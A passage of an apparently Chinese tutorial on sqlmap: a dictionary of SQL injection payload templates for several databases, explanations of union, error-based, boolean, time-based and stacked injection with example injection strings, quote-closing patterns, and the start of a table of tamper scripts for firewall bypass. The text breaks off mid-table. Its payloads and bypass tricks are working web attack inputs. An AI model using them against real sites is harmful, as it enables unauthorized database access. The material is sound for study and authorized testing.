class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_18":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM],[ORIGVALUE])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_19":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_52":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_56":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_57":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ;IIF([RANDNUM]=[RANDNUM1],1,1/0)', 'dbms': 'Microsoft Access',</span><br><span class="line">         'payload': ' ;IIF([RANDNUM]=[RANDNUM],1,1/0)', 'level': '1'&#125;,</span><br><span class="line">    "INJPAY_54":</span><br><span class="line">        &#123;'comparsion': ' ;IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]',</span><br><span class="line">         'dbms': 'Microsoft SQL Server',</span><br><span class="line">         'payload': ' ;IF([RANDNUM]=[RANDNUM]) <span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> [RANDSTR]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_1":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_2":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_3":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">NOT</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">NOT</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_4":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_5":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_6":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">RLIKE</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">RLIKE</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_7":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_8":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_9":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_53":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_49":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM1] <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span>dbms<span class="string">': '</span>SAP MaxDB<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM] <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_48":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM1] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span>dbms<span class="string">': '</span>SAP MaxDB<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_45":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_44":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_47":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_46":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],<span class="number">1</span>,<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>,<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_41":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_40":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_43":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_42":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="三、sqlmap的探测注入类型"><a href="#三、sqlmap的探测注入类型" class="headerlink" title="三、sqlmap的探测注入类型"></a>三、sqlmap的探测注入类型</h3><h4 id="3-1-UNION-query-SQL-injection（联合查询注入）"><a href="#3-1-UNION-query-SQL-injection（联合查询注入）" class="headerlink" title="3.1 UNION query SQL injection（联合查询注入）"></a>3.1 UNION query SQL injection（联合查询注入）</h4><p>​      联合查询就是通过union关键字将多条语句合并在一起执行，让前一条语句报错从而让后一条语句的执行结果输出到前一条语句的显位中。需要注意的是查询语句要符合1.相同列数2.相似的数据类型3.相同的编码。</p>
<p><strong>示例语句：id=-1’ union select 1,(select user()),(select version())#</strong></p>
<h4 id="3-2-Error-based-SQL-injection（基于报错型注入）"><a href="#3-2-Error-based-SQL-injection（基于报错型注入）" class="headerlink" title="3.2 Error-based SQL injection（基于报错型注入）"></a>3.2 Error-based SQL injection（基于报错型注入）</h4><p>​      报错型注入是利用了MySQL的第8652号BUG，但是用echo mysql_error();输出了错误信息时使用，</p>
<p><strong>示例语句：id=’ and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#</strong></p>
<p>当然如果报错的数据不能回显到页面上来，就无法使用报错注入，这时候我们就可以考虑是否存在盲注。</p>
<h4 id="3-3-Boolean-based-blind-SQL-injection（基于布尔型的盲注）"><a href="#3-3-Boolean-based-blind-SQL-injection（基于布尔型的盲注）" class="headerlink" title="3.3 Boolean-based blind SQL injection（基于布尔型的盲注）"></a>3.3 Boolean-based blind SQL injection（基于布尔型的盲注）</h4><p>​       布尔盲注的核心思想就是通过判断两种不同的页面状态来进一步推断注入语句是否被执行以及数据是否存在。<br><strong>示例语句：id=1’ and length(database())&gt;1 #</strong><br>​        当我们输入的注入语句无法通过回显以及报错的方式来获取数据，这时候就可能存在盲注，通过判断有跟没有、对或错来判断regexp 是否匹配到数据了。</p>
<h4 id="3-4-Time-based-blind-SQL-injection（基于时间的盲注）"><a href="#3-4-Time-based-blind-SQL-injection（基于时间的盲注）" class="headerlink" title="3.4 Time-based blind SQL injection（基于时间的盲注）"></a>3.4 Time-based blind SQL injection（基于时间的盲注）</h4><p>​       如果在测试的时候发现都不存在前面三种所说的注入，那就有可能是时间盲注，时间盲注的特点是无回显，无报错，也没有多种页面状态。这时候就需要通过增加sleep()函数来判断注入语句的执行，而布尔则是根据页面的对错来判断。</p>
<p><strong>示例语句：id=1’ and sleep(5)# 如果sleep则可以初步判断可能存在时间盲注</strong></p>
<h4 id="3-5-Stacked-queries-SQL-injection（可多语句查询注入）"><a href="#3-5-Stacked-queries-SQL-injection（可多语句查询注入）" class="headerlink" title="3.5 Stacked queries SQL injection（可多语句查询注入）"></a>3.5 Stacked queries SQL injection（可多语句查询注入）</h4><p>​        多语句查询注入也叫做堆叠查询，与联合查询有点相似，都可以多条语句查询，堆叠查询的关键是分号(;)比较直观的就是如果分号被过滤或者无法绕过就无法注入，当然还有一些数据库引擎不支持，权限不足等限制，实际工作中遇到的也很比较少，这里就不做过多讨论。</p>
<h4 id="3-6-sql注入闭合类型"><a href="#3-6-sql注入闭合类型" class="headerlink" title="3.6 sql注入闭合类型"></a>3.6 sql注入闭合类型</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=$<span class="keyword">id</span>;          <span class="comment">#这种情况下，$id变量多为数字型    不需要闭合符号，可以直接注入，但如果系统做了只能传入数字型的判断，就无法注入</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span>;        <span class="comment">#这种情况下，$id变量多为字符型    需要闭合单引号，可以用?id=1'这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">"$id"</span>;        <span class="comment">#这种情况下，$id变量多为字符型    需要闭合双引号，可以用?id=1"这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=($<span class="keyword">id</span>);        <span class="comment">#这种情况下，$id变量多为数字型    需要闭合括号，可以用?id=1)这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="string">'$id'</span>);      <span class="comment">#这种情况下，$id变量多为字符型    需要同时闭合单引号和括号，可以用?id=1')这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="string">"$id"</span>);      <span class="comment">#这种情况下，$id变量多为字符型    需要同时闭合双引号和括号，可以用?id=1")这种形式闭合</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=((<span class="string">'$id'</span>));    <span class="comment">#这种情况下，$id变量多为字符型    需要同时闭合单引号和两层括号，可以用?id=1'))这种形式闭合</span></span><br><span class="line"></span><br><span class="line">有些语句还有limit子句，如<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">tables</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;，我们可以通过上面提到的方法先闭合单引号，然后用%23，即注释符注释掉后面的语句，具体写法如下：?id=1'%23；即可闭合输出正确的语句</span><br><span class="line"></span><br><span class="line">*注：这里只列举几种常见的写法，可以结合实际情况，进行闭合符号，没有什么固定的方式，但最终达到一个目的就好了，就是闭合语句中可能有的符号，注释掉我们不需要或者可能会限制我们继续注入的部分。使得我们注入这些闭合原有语句的符号后，得到的语句还是正确并且可被执行的。</span><br></pre></td></tr></table></figure>

<h3 id="四、sqlmap的tamper参数绕过waf脚本"><a href="#四、sqlmap的tamper参数绕过waf脚本" class="headerlink" title="四、sqlmap的tamper参数绕过waf脚本"></a>四、sqlmap的tamper参数绕过waf脚本</h3><table>
<thead>
<tr>
<th><strong>支持的数据库</strong></th>
<th>编号</th>
<th>脚本名称</th>
<th>作用</th>
<th>实现方式</th>
</tr>
</thead>
<tbody><tr>
<td>all</td>
<td>1</td>
<td>apostrophemask.py</td>
<td>用utf8代替引号</td>
<td>(“1 AND ‘1’=’1”)  ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td>
</tr>
<tr>
<td>all</td>
